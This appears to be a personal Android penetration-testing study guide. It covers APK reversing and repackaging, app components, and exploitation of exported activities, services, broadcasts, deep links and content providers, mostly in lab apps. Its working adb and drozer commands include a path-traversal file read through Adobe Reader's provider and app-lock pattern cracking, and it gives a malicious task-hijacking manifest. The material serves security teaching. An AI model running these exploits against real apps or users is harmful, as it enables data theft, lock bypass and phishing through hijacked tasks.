# Android_Pentest



### application journey

application journey from development to end user

**1. from the code to apk**

the default language for creating android applications is java or kotlin. additionally developers can write some code in c,c++. also the application contains xml files like androidMainfest.xml. along these files also there may be some resources such as scripts, images, audio, video, etc.

all these files are combined in a single zip file which is the final application package (apk). this apk file is signed with the developer certificate. the signed application is submitted to google play store and gets published once google decides that no malicious code or suspicious activity  in the application. finally users can download the application from play store.



the code is compiled into classes.dex file (Dalvik executable) and package it to apk file

### convert from apk to code

```
adb shell ps | grep -i app_name
adb shell pm list packages -f app_name
adb pull /path/to/apk_file
unzip app.apk -d dir_name 
```

till now we will have 

- AndroidMainfest.xml file
- META-INF directory that contains certificate information (cert_file_name.RSA)
- res directory
- kotlin directory
- classes.dex file where we have all the compiled java and kotlin classes



#### view the certificate

```
cd META-INF
keytool -printcert -file BNDLTOOL.RSA
```



### Reversing Android apps (static analysis)

#### 1. apktool

it shows a human readable version of the code known as `smali`. apktool gives us a smali representation of the Dalvik bytecode, we can modify the instructions and repackage the application and create a new version. but the smali syntax is not easy to understand. 

AndroidManifest.xml file generated in a readable format

so with apktool we can use it to modify the code but it is hard to analyze it.  

Analyze >> :no_entry:

Modify >> :white_check_mark:

```
apktool d app.apk
```



<br />

#### 2. JADx

go back to the original source code but it will be approximate representation of the original source code look like.

AndroidManifest.xml file generated in a binary format

so with JADx we can analyze the code becuase it gives us the original java or kotlin source code but we can not modify the source code.

Analyze >> :white_check_mark:

Modify >> :no_entry:





![](./assets/1.png)







### [AndroidManifest.xml](https://developer.android.com/guide/topics/manifest/manifest-intro)

The **AndroidManifest.xml file** *contains information of your package*, including components of the application such as activities, services, broadcast receivers, content providers etc.

- Supported screen sizes
- Supported SDK versions: minimum, target, and maximum
- Ability to send Push Notifications
- Various permissions for the application
- intent filters







### Patching android apps

when analyzing an application, a certain code in the application may stops or limits us from performing in depth analysis like preventing us from viewing the network traffic, root detection mechanisms. it is also used by the attackers to do things like bypass licenses, get access to the premium functions of the application, remove Advs or write backdoors.

we will make changes in the smali code and do modifications then generate the new apk file.

after modifying the smali code, we will generate the apk file 

``` 
delete META-INF directory

apktool b app_dir/ -o app_modified.apk
b >> build

adb install app_modified.apk
```



also in AndroidMainfest.xml make `android:testOnly="false" `

```
<application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:debuggable="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:roundIcon="@mipmap/ic_launcher_round" android:supportsRtl="true" android:testOnly="false" android:theme="@style/Theme.Kotlin1">
```



you will get an error because the certificate is not valid. so you need to generate a new valid certificate

```
PS > adb install kotlin1modified.apk
Performing Streamed Install
adb: failed to install kotlin1modified.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl632657351.tmp/base.apk: Attempt to get length of null array]
```





```
keytool.exe -genkey -v -keystore release.keystore -alias alias -keyalg RSA -keysize 2048 -validity 10000
```





```
jarsigner.exe -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore D:\tools\mobile\apps\kotlin1\kotlin1\release.keystore D:\tools\mobile\apps\kotlin1\kotlin1modified.apk alias

Enter Passphrase for keystore:
>>> Signer
    X.509, CN=kaim, OU=ITI, O=ITI, L=cairo, ST=cairo, C=eg
    Signature algorithm: SHA384withRSA, 2048-bit key
    [trusted certificate]

jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.
```





### [Android components](https://developer.android.com/guide/components/fundamentals)

There are four types of app components:

- Activities
- Services
- Broadcast receivers
- Content providers



#### Activity

screens of the application. the layout or view is called an activity. An *activity* is the entry point for interacting with the user. It represents a single screen with a user interface. 

An activity facilitates the following key interactions between system and app:

- Keeping track of what the user currently cares about—what is on-screen—so that the system keeps running the process that is hosting the activity.
- Knowing which previously used processes contain stopped activities the user might return to and prioritizing those processes more highly to keep them available.
- Helping the app handle having its process killed so the user can return to activities with their previous state restored.
- Providing a way for apps to implement user flows between each other, and for the system to coordinate these flows. The primary example of this is sharing.

- Layout defined in res/layout/*.xml
- one activity can launch another activity via intents 



Activity in java

```java
public class MainActivity extends Activity {
}
```



Activity in kotlin

```kotlin
class MainActivity : AppCompatActivity() {
}
```



#### Services

A *service* is a general-purpose entry point for keeping an app running in the background for all kinds of reasons. It is a component that runs in the background to perform long-running operations or to perform work for remote processes. A service does not provide a user interface.These components run at the backend, updating your data sources and Activities, triggering Notification, and also broadcast Intents. They also perform some tasks when applications are not active. A service can be used as a subclass of class Service: 



service in java

```java
public class ServiceName extends Service {
}
```



service in kotlin

```kotlin
class ServiceName : Service() {
}
```



#### Broadcast receivers

A broadcast receiver is a component that lets the system deliver events to the app outside of a regular user flow so the app can respond to system-wide broadcast announcements. Because broadcast receivers are another well-defined entry into the app, the system can deliver broadcasts even to apps that aren't currently running.

So, for example, an app can schedule an alarm to post a notification to tell the user about an upcoming event. Because the alarm is delivered to a `BroadcastReceiver` in the app, there is no need for the app to remain running until the alarm goes off.

Many broadcasts originate from the system, like a broadcast announcing that the screen is turned off, the battery is low, or a picture is captured. Apps can also initiate broadcasts, such as to let other apps know that some data is downloaded to the device and is available for them to use.

A broadcast receiver is implemented as a subclass of `BroadcastReceiver`, and each broadcast is delivered as an `Intent`

```
public class MyReceiver  extends  BroadcastReceiver {
   public void onReceive(context,intent){}
}
```



#### **Content providers**

A *content provider* manages a shared set of app data that you can store in the file system, in a SQLite database, on the web, or on any other persistent storage location that your app can access. Through the content provider, other apps can query or modify the data, if the content provider permits it.

A content provider component supplies data from one application to others on request. Such requests are handled by the methods of the *ContentResolver* class. The data may be stored in the file system, the database or somewhere else entirely.

A content provider is implemented as a subclass of **ContentProvider** class and must implement a standard set of APIs that enable other applications to perform transactions.

```java
public class MyContentProvider extends  ContentProvider {
   public void onCreate(){}
}
```



#### Declare components

The primary task of the manifest is to inform the system about the app's components. For example, a manifest file can declare an activity as follows:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest ... >
    <application android:icon="@drawable/app_icon.png" ... >
        <activity android:name="com.example.project.ExampleActivity"
                  android:label="@string/example_label" ... >
        </activity>
        ...
    </application>
</manifest>
```

In the `<application>` element, the `android:icon` attribute points to resources for an icon that identifies the app.

In the `<activity>` element, the `android:name` attribute specifies the fully qualified class name of the `Activity` subclass, and the `android:label` attribute specifies a string to use as the user-visible label for the activity.

You must declare all app components using the following elements:

- `<activity>` elements for activities
- `<service>` elements for services
- `<receiver>` elements for broadcast receivers
- `<provider>` elements for content providers

Activities, services, and content providers that you include in your source but don't declare in the manifest aren't visible to the system and, consequently, can never run. However, broadcast receivers can either be declared in the manifest or created dynamically in code as `BroadcastReceiver` objects and registered with the system by calling `registerReceiver()`.





### Intents

A messaging object that you can use to request an action from another application component. there are three kind of actions that intent can use for 

- startActivity()
- startService(), bindService()
- startBroadcast()

Intents in java

```java
public class Intent
extends Object implements Parcelable, Cloneable
```



Intents in kotlin

```kotlin
open class Intent : Parcelable, Cloneable
```



#### Intent Structure

- **action** -- The general action to be performed, such as `ACTION_VIEW`, `ACTION_EDIT`, `ACTION_MAIN`, etc.
- **data** -- The data to operate on, such as a person record in the contacts database, expressed as a `Uri`.
- **category** -- Gives additional information about the action to execute. For example, `CATEGORY_LAUNCHER` means it should appear in the Launcher as a top-level application, while `CATEGORY_ALTERNATIVE` means it should be included in a list of alternative actions the user can perform on a piece of data.
- **type** -- Specifies an explicit type (a MIME type) of the intent data. Normally the type is inferred from the data itself. By setting this attribute, you disable that evaluation and force an explicit type.

Some examples of action/data pairs are:

- `ACTION_VIEW` content://contacts/people/1 -- Display information about the person whose identifier is "1".

- `ACTION_EDIT` content://contacts/people/1 -- Edit information about the person whose identifier is "1".

  

#### [Intent Resolution](https://developer.android.com/reference/android/content/Intent#intent-resolution)

There are two primary forms of intents you will use.

- **Explicit Intents** have specified a component (via `setComponent(ComponentName)` or `setClass(Context, Class)`), which provides the exact class to be run. Often these will not include any other information, simply being a way for an application to launch various internal activities it has as the user interacts with the application.
- **Implicit Intents** have not specified a component; instead, they must include enough information for the system to determine which of the available components is best to run for that intent.





### Exploiting Activities

```
adb shell ps | grep app  # to get the package name
adb shell am start -n package_name/.activity_name
```

Note: the activity should be exported or has intent-filter



### Send Intent to the application

```
adb shell am start -n package_name/package_name.class_name --ei intent_extra extra_value
OR
adb shell am start -n package_name/.class_name --ei intent_extra extra_value

-n >> activity name
--ei >> extra integer
--ez >> extra boolean
--es >> extra string
```



example

```
adb shell am start -n com.er.mo.apps.mypasswords/com.er.mo.apps.mypasswords.settings.AppearanceSettings --ei com.er.mo.apps.mypasswords.EXTRA_SUFCXNUQVRF 2
```





### [Fragments](https://developer.android.com/guide/fragments)

is the part of activity, it is also known as sub-activity. There can be  more than one fragment in an activity. Fragments represent multiple  screen inside one activity.

Android fragment lifecycle is affected by activity lifecycle because fragments are included in activity.

Each fragment has its own life cycle methods that is affected by activity life cycle because fragments are embedded in activity.











---

### Intent filter

- Implicit intent uses the intent filter to serve the user request.
- The intent filter specifies the types of intents that an activity, service, or broadcast receiver can respond.
- Intent filters are declared in the Android manifest file.
- Intent filter must contain `<action>`

**Examples of common action:**

- **ACTION_VIEW:** Use this action in intent  with startActivity() when you have some information that activity can  show to the user like showing an image in a gallery app or  an address  to view in a map app
- **ACTION_SEND:** You should use this in intent  with startActivity() when you have some data that the user can share  through another app, such as an email app or social sharing app.





### insecure service in allsafe.apk

in AndroidManifest.xml

```xml
 <service
            android:name="infosecadventures.allsafe.challenges.RecorderService"
            android:enabled="true"
            android:exported="true"/>
```



in infosecadventures.allsafe.challenges.RecorderService

```java
package infosecadventures.allsafe.challenges;

public class RecorderService extends Service implements MediaRecorder.OnInfoListener {

    private void startRecording() {
        Toast.makeText(this, "Audio recording started!", 0).show();
        try {
            MediaRecorder mediaRecorder = new MediaRecorder();
            this.mediaRecorder = mediaRecorder;
            mediaRecorder.setAudioSource(1);
            this.mediaRecorder.setMaxDuration(10000);
            this.mediaRecorder.setOutputFormat(2);
            this.mediaRecorder.setAudioEncoder(3);
            this.mediaRecorder.setAudioEncodingBitRate(64000);
            this.mediaRecorder.setAudioSamplingRate(16000);
            File outputFile = getOutputFile();
            this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            this.mediaRecorder.prepare();
            this.mediaRecorder.start();
        } catch (Exception e) {
            Log.d("ALLSAFE", "Exception: " + e.getMessage());
        }
    }
}
```



start the service with adb

```shell
adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService
```







### Broadcast receiver

Android BroadcastReceiver is a dormant component of android that listens to system-wide broadcast events or [intents](https://www.digitalocean.com/community/tutorials/android-studio-tutorial-hello-world-app). When any of these events occur it brings the application into action by either creating a status bar notification or performing a task. Unlike  activities, android `BroadcastReceiver` doesn’t contain any  user interface. Broadcast receiver is generally implemented to delegate  the tasks to services depending on the type of intent data that’s  received. Following are some of the important system wide generated  intents.



- System-wide events that happen on the device will be sent  >> `broadcast`

- Applications can listen to messages for the events >> `Intent-Filter`
- Act on the selected messgaes  >>  `Broadcast Receiver`

- Both System and apps can create a broadcast
- Types of broadcast: static, dynamic 





![](./assets/3.png)



In the androidMainfest.xml we have a `receiver` element, the receiver will be listing on the broadcast with `intent-filter`. in the `broadcast receiver` class we have `onReceiver()` element that will receiver a broadcast and then act on it. so when  a broadcast gets initiated, the SYSTEM checks for all the intent filters and if an application has an intent-filter that matches the broadcast  properties, the system passes the broadcast to the component. 







### Static broadcast

![](./assets/4.png)





In the androidMainfest.xml we have a `receiver` element and `intent-filter` that will look for a broadcast. and will have a broadcast receiver class that has `onReceiver()` function.







### Dynamic  broadcast

![](./assets/5.png)

you will not find anything in the androidMainfest.xml. instead, in one of the app classes you will find `rigisterRecever()` which will register a new broadcast receiver that will be valid only for the application life cycle and look for the pattern defined in the class. and you will have `onReceive()` function which will determine what action you need to perform when a broadcast is received. dynamic broadcast receiver works only when the app is running.





### irccloud.apk

#### 1. With adb

```bash
adb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e "title" "exploit-POC" -e "auth_url" "https://google.com"
```



#### 2. With android application

```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)

        // exploit SAML activity
        val intent = intent.setClassName("com.irccloud.android","com.irccloud.android.activity.SAMLAuthActivity");
        intent.putExtra("title","exploit-POC");
        intent.putExtra("auth_url","https://google.com");
        startActivity(intent);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }
    }
```



### DynamicBR.apk

#### 1. With adb

```bash
adb shell am start -n edu.ksu.cs.dynamicbr/edu.ksu.cs.dynamicbr.EmailActivity -e "email" "karim@gmail.com" -e "text" "Exploit Dynamic Broadcast POC"

-n >> activity name
```





 #### 2. With android application

```kotlin
class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }


        val intent = Intent("edu.ksu.cs.action.EMAIL")
        intent.putExtra("email", "karim@gmail.com");
        intent.putExtra("text", "I am pentester");
        sendBroadcast(intent);

    }
}
```



#### 3. With drozer

```shell
dz> app.broadcast.send --action edu.ksu.cs.action.EMAIL --extra string email karim@gmail.com --extra string text I am pentester
```



#### insecure broadcast receiver in allsafe.apk

```shell
adb shell am broadcast -a infosecadventures.allsafe.action.PROCESS_NOTE --es "server" "prod.allsafe.infosecadventures.io" --es "note" "just a note" --es "notification_message" "Allsafe is processing your note..." -n infosecadventures.allsafe/.challenges.NoteReceiver
```



#### get all intents using medusa

```shell
medusa> use modules/ipc/incoming_intents.med
medusa> use modules/ipc/outgoing_intents.med

run frida server
medusa> run -f infosecadventures.allsafe
```













---

### Deep links

A Deep Link is a URL link that is generated, when anyone clicks on that link our app will be open with a specific activity or a screen. Using this URL we can send a message to our app with parameters. In WhatsApp, we can generate a deep link to send a message to a phone number with some message in it. Deep links are used to open your app’s specific screen with a URL link. 





![](./assets/6.png)





#### Exploit deep link in allsafe.apk

in AndroidManifest.xml

```xml
        <activity
            android:theme="@style/Theme.Allsafe.NoActionBar"
            android:name="infosecadventures.allsafe.challenges.DeepLinkTask">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data
                    android:scheme="allsafe"
                    android:host="infosecadventures"
                    android:pathPrefix="/congrats"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="https"/>
            </intent-filter>
        </activity>

```



in infosecadventures.allsafe.challenges.DeepLinkTask

```java
public class DeepLinkTask extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_deep_link_task);
        Intent intent = getIntent();
        String action = intent.getAction();
        Uri data = intent.getData();
        Log.d("ALLSAFE", "Action: " + action + " Data: " + data);
        try {
            if (data.getQueryParameter("key").equals(getString(R.string.key))) {
                findViewById(R.id.container).setVisibility(0);
                SnackUtil.INSTANCE.simpleMessage(this, "Good job, you did it!");
            } else {
                SnackUtil.INSTANCE.simpleMessage(this, "Wrong key, try harder!");
            }
        } catch (Exception e) {
            SnackUtil.INSTANCE.simpleMessage(this, "No key provided!");
            Log.e("ALLSAFE", e.getMessage());
        }
    }
}
```





in res/values/strings.xml

```xml
  <string name="key">ebfb7ff0-b2f6-41c8-bef3-4fba17be410c</string>
```





```shell
adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats"
```

No key provided!. 

 we need to provide the key



```shell
 adb shell am start -a "android.intent.action.VIEW" -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c"
```







- https://www.geeksforgeeks.org/deep-linking-in-android-with-example/
- https://developer.android.com/training/app-links/deep-linking
- https://medium.com/androiddevelopers/the-deep-links-crash-course-part-1-introduction-to-deep-links-2189e509e269











---

### Data Storage

Data can be stored in three different ways: internal, external and remote

#### Internal Data storage

- uses internal storage 
- Type of data technique based on developer's preference and data type
- location: /data/data/package_name/

#### Types

- Shared preferences
- Databases
- Raw files 
- Keychain
- Cache



**Shared preferences**

- small key-value pairs 
- Examples: profile information, High score, configuration information, etc...
- developer may store sensitive information in cleartext 
- Location: /data/data/package_name/shared-prefs/
- Protected with UID (liunx based) or GID (permissions based) security



**Read from shared preferences**

```java
SharedPreferences sharedPref = getActivity().getPreferences(Context.MODE_PRIVATE);
int defaultValue = getResources().getInteger(R.integer.saved_high_score_default_key);
int highScore = sharedPref.getInt(getString(R.string.saved_high_score_key), defaultValue);
```



**Write to shared preferences**

```java
SharedPreferences sharedPref = getActivity().getPreferences(Context.MODE_PRIVATE);
SharedPreferences.Editor editor = sharedPref.edit();
editor.putInt(getString(R.string.saved_high_score_key), newHighScore);
editor.apply();
```





#### SQLite

- Shared Preferences not suited for complex data
- SQLite is fast and lightweight RDBMS
- Location:  /data/data/package_name/databases/
- has security protections



to open sqlite database you can use sqlite3 or sqlitebrowser

```sqlite
sqlite3 db-name.db

sqlite> .tables
sqlite> select * from table_name;
sqlite> .dump
sqlite> .quit
```



#### SQLite additional files

- journal (logging) and lock files (concurrency)
- Less relevant from a security perspective
- you can use `strings` or `grep` to see if it 's leaking any sensitive information like data that has been deleted from the database





#### External Data storage

- any storage location outside device's on-board storage like SDcard or Virtual SDcard 
- Larger files: anything larger than configuration files or very small media/assets
- Lacation: /mnt/sdcard OR /storage   

in order to know if the application is storing external data you can know with

1. source code analysis (ExternalStrorage)
2. look for permissions `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE` and `MANAGE_EXTERNAL_STORAGE`
3. from API 29 android 10: ScopeStorage: access only the application specific directory on external storage as well as specific types of media that the app has created.

**Analysing external storage**

```
adb shell ls -lRa /mnt/sdcard/ | grep -iRn "string"
```





#### Remote Data storage

Android applications can store data remotely like storing data in firebase



**Firebase**

- Firebase offers firebase realtime Database: a remote NoSQL database
- Supports Android, IOS and web
- uses a json data model: Nodes (no tables)
- works even if the device is offline: assess from cache and sync once online



**Firebase vulnerabilities**

- vulnerabilities based on configuration (misconfiguration related security issues)
  - making the database read/write accessible for the public
  - public read access
- Query to find if it is insecure: https://project.firebaseio.com/.json



**Tools to detect Firebase vulnerabilites **

- [FireBase Scanner](https://github.com/shivsahni/FireBaseScanner)



- https://medium.com/@sandeepkella23/exploring-data-storage-in-android-types-advantages-datastore-real-time-use-cases-and-best-8bb42fa6792e
- https://www.geeksforgeeks.org/shared-preferences-in-android-with-examples/
- https://hackerone.com/reports/684099
- https://abss.me/posts/fcm-takeover/#the-fcm-server-key---reading-docs-and-validation-of-the-key
- https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/





---

### Content provider

you can find content providers in AndroidMainfest.xml file `<provider>` or in the application source code search for `content://`

#### Exploiting content provider in catch.apk 

the content provider `<provider>` is exported in AndroidMainfest.xml

```
apktool d catch.apk
grep -iRn 'content://' catch/
```



Query the content 

```bash
adb shell content query --uri content://com.threebanana.notes.provider.NotePad/notes

Row: 0 source=NULL, parent_id=-1, timestamp=1715042453559, sharekey=0, hashcodes=, photo_thumb=NULL, altitude=0.0, api_pending_op=1, depth=0, short_text=, _id=1, note_mode=, nodeid=-1, source_url=NULL, photo_revision=0, accuracy_position=0.0, longitude=0.0, shareURL=, owner_id=-1, owner=Me, reminder=0, photo=, photo_src=, server_modified_at=0, publicURL=, speed=0.0, accuracy_altitude=0.0, child_count=0, display_order=0, text=test note
this is a secret note, latitude=0.0, bearing=0.0, labels=, created=1715042453559, parent_nodeid=-1
```

**Note:** even if you an access the content provider, still we can not say it is insecure content provider. because we have query the content provider with `adb` in genymotion and `adb` runs with root privilege, so you has access to the all system files.

to verify if the content provider is actually vulnerable you need to access the content provider from a limited access user and then see if you still can access the content provider. you can do this by running `adb` with less privileged user or you can use `drozer` which includes an application that runs in the device and since it is just another application in the device, it runs with normal application privileges and by executing queries through `drozer` if you able to access some sensitive information, any third party application can access that data 



**connect to drozer**

```bash
adb forward tcp:31415 tcp:31415
drozer console connect
```



**find content provider URIs**

```sql
dz > run app.provider.finduri  com.threebanana.notes
```



**Query the content provider**

```sqlite
dz> run app.provider.query content://com.threebanana.notes.provider.NotePad/notes --vertical
            source  null
         parent_id  -1
         timestamp  1715042453559
          sharekey  0
         hashcodes  
       photo_thumb  null
          altitude  0
    api_pending_op  1
             depth  0
        short_text  
               _id  1
         note_mode  
            nodeid  -1
        source_url  null
    photo_revision  0
 accuracy_position  0
         longitude  0
          shareURL  
          owner_id  -1
             owner  Me
          reminder  0
             photo  
         photo_src  
server_modified_at  0
         publicURL  
             speed  0
 accuracy_altitude  0
       child_count  0
     display_order  0
              text  test note
this is a secret note
          latitude  0
           bearing  0
            labels  
           created  1715042453559
     parent_nodeid  -1

```

 since drozer can read the content provider, any third party application can access the data stored in sqlite database by querying the content provider uri . so this content provider is vulnerable.



---

### [Drozer](https://labs.withsecure.com/tools/drozer)

![](./assets/2.png)







```
adb forward tcp:31415 tcp:31415
drozer console connect
drozer console connect --server ip_address

dz > permissions
```



show all different modules that drozer can use

```
dz > list
```





list all installed applications

```
dz > run app.package.list
dz > run app.package.list -f app_name
```



get info about package

```
dz > run app.package.info -a package_name
```



list all URIs in the app

```
dz > run scanner.provider.finduris -a package_name
```



find content provider URIs

```
dz > run app.provider.finduri  package_name
```





get data from content provider

```
dz > run app.provider.query content://...
dz > run app.provider.query content://...  --vertical
```



send broadcast action with extras

```
dz > run app.broadcast.send --action ACTION --extra string email user@gmail.com
```

**Note:** to run the broadcast the application must be open 



#### exploit content provider to read files with adobe.apk

run drozer and search for adobe

```
adb forward tcp:31415 tcp:31415
drozer console connect
dz > run app.package.list -f adobe
dz > run app.package.info -a com.adobe.reader
```

Note: adobe has permissions to access the external storage



use content provider to read files from sdcard

```
dz > run app.provider.finduri  com.adobe.reader
dz > run app.provider.query content://com.adobe.reader.fileprovider/ >> Error
```

this error because app.provider.query used to query content providers related to read data from the database, in this case we need to use app.provider.read



```
dz > run app.provider.read content://com.adobe.reader.fileprovider/../../../../../../../mnt/sdcard/secret.txt
```



---

### Broadcast receiver sniffing

Broadcast sniffing means we are able to capture a broadcast that has been generated on an android device. it is important because broadcast can carry sensitive information.

Broadcast receiver works by registering an intent-filter in the `androidMainfest.xml` and that matches the user specified attributes  of the broadcast. so whenever the application see there is a broadcast with a certain value and matches the specified intent-filter, the broadcast receiver that supposed to be handling that intent-filter gets triggered 



#### Broadcast receiver sniff in flagstore.apk





```
 Mobexler@Mobexler  ~  adb forward tcp:31415 tcp:31415                                         
31415

Mobexler@Mobexler  ~  drozer console connect                                                   
Selecting ed634d27a8f5a269 (unknown Pixel 7.0)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.4.4)
dz> run app.package.list -f flag
com.flagstore.ctf.flagstore (FlagStore)


dz> run app.package.info -a com.flagstore.ctf.flagstore
Package: com.flagstore.ctf.flagstore
  Application Label: FlagStore
  Process Name: com.flagstore.ctf.flagstore
  Version: 1.0
  Data Directory: /data/user/0/com.flagstore.ctf.flagstore
  APK Path: /data/app/com.flagstore.ctf.flagstore-1/base.apk
  UID: 10073
  GID: []
  Shared Libraries: null
  Shared User ID: null
  Uses Permissions:
  - None
  Defines Permissions:
  - ctf.permissions._MSG
  - ctf.permissionn._SEND


dz> run app.broadcast.sniff --action com.flagstore.ctf.OUTGOING_INTENT
[*] Broadcast receiver registered to sniff matching intents
[*] Output is updated once a second. Press Control+C to exit.

Action: com.flagstore.ctf.OUTGOING_INTENT
Raw: Intent { act=com.flagstore.ctf.OUTGOING_INTENT flg=0x10 (has extras) }
Extra: msg=CongratsGoodWorkYouFoundI???Ai??Jm`uImuFfgJ]|TAsmsumqM@oltnbw^|geFar (java.lang.String)

^C

```





```
adb shell am broadcast -a com.flagstore.ctf.INCOMING_INTENT --es msg OpenSesame
```



```
dz> run app.broadcast.sniff --action com.flagstore.ctf.OUTGOING_INTENT
```







---

### cracking android pattern for the android apps

android apps like app lock

- [Android Pattern Lock Cracker](https://github.com/sch3m4/androidpatternlock)

- [APLBreaker](https://github.com/AleDiBen/APLBreaker)



### cracking android pattern/pin for the android device

the pattern is stored in gesture.key file

- [Android-PIN-Bruteforce](https://github.com/urbanadventurer/Android-PIN-Bruteforce)



**Analyzing and cracking lock in applock.apk**

```xml
vbox86p:/data/data/com.domobile.applock/shared_prefs # cat com.domobile.applock_preferences.xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="last_unlock_pkg">com.domobile.applock</string>
    <boolean name="vibrate_pattern_lock" value="false" />
    <string name="image_lock_pattern">/+wecNETsLlsfmyyszRg4kQHqW4=&#10;    </string>
    <boolean name="last_secure_level" value="false" />
    <boolean name="first_launch" value="true" />
    <string name="secure_email">test@gmail.com</string>
    <boolean name="is_image_lock_pattern" value="true" />
    <int name="current_android_sdk_version" value="24" />
    <int name="lockactivity_open_times" value="1" />
    <boolean name="initial_has_notice" value="true" />
    <long name="latest_leave_app_timemills" value="1715389747531" />
    <string name="key_available_hider_folder">.MySecurityData</string>
    <float name="ads_random_value" value="0.64804226" />
</map>
```



from the source code, we found that the pattern is stored as SHA-1 hash then got encoded in base64, so we need to decode it

```shell
└─$ echo "/+wecNETsLlsfmyyszRg4kQHqW4=&#10;" | base64 -d > patAppLock.key
```



cracking the hash to get the pattern

```shell
┌──(kali㉿kali)-[~/Desktop/tools/mobile/APLBreaker]
└─$ python aplbreaker.py patAppLock.key 
[ CRACKED! ] 01258
```



crack the pattern using Android Pattern Lock Cracker

```shell
┌──(kali㉿kali)-[~/Desktop/tools/mobile/AndroidPatternLock]
└─$python3 aplc.py patAppLock.key
```





---

### StrandHogg / Task hijacking

#### [Tasks and the back stack](https://developer.android.com/guide/components/activities/tasks-and-back-stack)

A task is a collection of activities that users interact with when performing a certain job. The activities are arranged in a stack—the *back stack*)—in the order in which each activity is opened.

The activity that is displayed on the screen is called a foreground activity and its task is called the foreground task. At a time, only one foreground task is visible on the screen. 

`AndroidManifest.xml` is a file that provides the developer with two attributes : `taskAffinity` and `allowTaskReparenting` to be added to Activities in their app. There attributes also allow developers to tweak the task in which an activity opens up. A brief description on both of these attributes are :

1. `taskAffinity` : This attribute is set to a string value that is a name of the package. In order to start your Activity into a different task or a task of another package, you need to set this variable to the name of the package.
2. `allowTaskReparenting` : This attribute can be set to either true or false. On setting it to true, developer allows an activity to be started from a different task than its launching task. Let’s consider Activity A opens Activity B. With this attribute set to false, Activity B will open in same task as Activity A [in other words : an activity that launched Activity B]. But with the attribute set to true, Activity B can move from Activity A’s task to the task it has affinity for.



in androidMainfest.xml:

<activity android:launchMode="singleTask" android:excludeFromRecents="true" android:taskAffinity="com.GOSI.Bayani" 



**Detection**

if the main activity (Launcher) has `android:launchMode="singleTask"` , so this application is vulnerable to task hijacking



**Exploitation using malicious application**

in androidMainfest.xml

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.els.leaker" >
<uses-sdk android:targetSdkVersion="24"/>
<application
    android:sharedUserId="com.els"
    android:allowBackup="true"
    android:icon="@mipmap/ic_launcher"
    android:logo="@mipmap/ic_launcher"
    android:label="Leaker"
    android:roundIcon="@mipmap/ic_launcher_round"
    android:supportsRt1="true"
    android:theme="@style/AppTheme">

    <activity android:name=".MainActivity" android:launchMode="singleTask" android:excludeFromRecents="true" android:taskAffinity="com.orange.orangawyapp" >         <<<<==== the vulnerable application package (com.orange.orangawyapp)
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
</application>
</manifest>
```

**Task affinity** is an attribute that is defined in each `<activity>` tag in the `AndroidManifest.xml` file. It describes which Task an Activity prefers to join.
By default, every activity has the same affinity as the **package** name.

We'll be using this when creating our PoC app.

```xml
<activity android:taskAffinity=""/>
```



**Launch modes** allow you to define how a new instance of an activity is associated with the current task. The [`launchMode`](https://developer.android.com/guide/topics/manifest/activity-element#lmode) attribute specifies an instruction on how the activity should be launched into a task.
There are four different Launch Modes:

1. standard
2. singleTop
3. singleTask
4. singleInstance

